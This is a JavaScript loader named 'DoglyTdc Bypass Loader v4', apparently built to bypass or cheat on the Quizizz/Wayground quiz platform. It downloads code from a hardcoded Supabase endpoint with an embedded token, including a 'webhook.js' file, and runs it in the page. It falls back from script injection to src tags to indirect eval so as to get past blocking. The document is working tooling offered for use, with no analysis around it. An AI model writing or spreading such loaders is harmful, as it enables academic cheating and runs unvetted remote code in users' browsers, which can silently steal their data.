// DoglyTdc Bypass Loader v4 - Native Bundle Loader
// Script: Quizizz Wayground Ai
(function () {
  "use strict";

  var SCRIPT_URL = "https://ucsyxzpdbnuyehizezvb.supabase.co/functions/v1/script-webhook?token=1277567b571b3f4196a751e4c6c4fa16a0e313d6b4085eea&format=raw&file=script.js";
  var WEBHOOK_URL = "https://ucsyxzpdbnuyehizezvb.supabase.co/functions/v1/script-webhook?token=1277567b571b3f4196a751e4c6c4fa16a0e313d6b4085eea&format=raw&file=webhook.js";

  if (!SCRIPT_URL) {
    try {
      var me = document.currentScript && document.currentScript.src;
      if (me) {
        var base = me.split("?")[0].replace(//bypass.js$/i, "");
        SCRIPT_URL = base + "/script.js";
        WEBHOOK_URL = base + "/webhook.js";
      }
    } catch (_) {}
  }

  if (!SCRIPT_URL) {
    console.error("[DoglyTdc] No script URL found");
    return;
  }

  var bust = "t=" + Date.now();

  function addBust(url) {
    return url + (url.indexOf("?") !== -1 ? "&" : "?") + bust;
  }

  function fetchAndInject(url) {
    return fetch(addBust(url), { cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("HTTP " + r.status);
        return r.text();
      })
      .then(function (code) {
        if (!code || !code.trim()) throw new Error("Empty response");
        var s = document.createElement("script");
        s.type = "text/javascript";
        s.textContent = code;
        (document.head || document.documentElement).appendChild(s);
        return true;
      });
  }

  function injectSrc(url) {
    return new Promise(function (resolve, reject) {
      var s = document.createElement("script");
      s.type = "text/javascript";
      s.src = addBust(url);
      s.onload = function () { resolve(true); };
      s.onerror = function () { reject(new Error("Script tag blocked")); };
      (document.head || document.documentElement).appendChild(s);
    });
  }

  function fetchAndEval(url) {
    return fetch(addBust(url), { cache: "no-store" })
      .then(function (r) {
        if (!r.ok) throw new Error("HTTP " + r.status);
        return r.text();
      })
      .then(function (code) {
        if (!code || !code.trim()) throw new Error("Empty response");
        (1, eval)(code);
        return true;
      });
  }

  function loadScript(url) {
    return fetchAndInject(url)
      .catch(function () {
        return injectSrc(url);
      })
      .catch(function () {
        return fetchAndEval(url);
      });
  }

  function run() {
    console.log("[DoglyTdc] ⚡ Loading scripts...");
    var loadWebhook = WEBHOOK_URL
      ? loadScript(WEBHOOK_URL).catch(function (e) {
          console.warn("[DoglyTdc] webhook.js skipped:", e.message);
        })
      : Promise.resolve();

    loadWebhook
      .then(function () {
        return loadScript(SCRIPT_URL);
      })
      .then(function () {
        console.log("[DoglyTdc] ✅ Scripts loaded successfully!");
      })
      .catch(function (err) {
        console.error("[DoglyTdc] ❌ Failed to load script:", err.message);
        try { alert("[DoglyTdc] Erro ao carregar script: " + err.message); } catch (_) {}
      });
  }

  run();
})();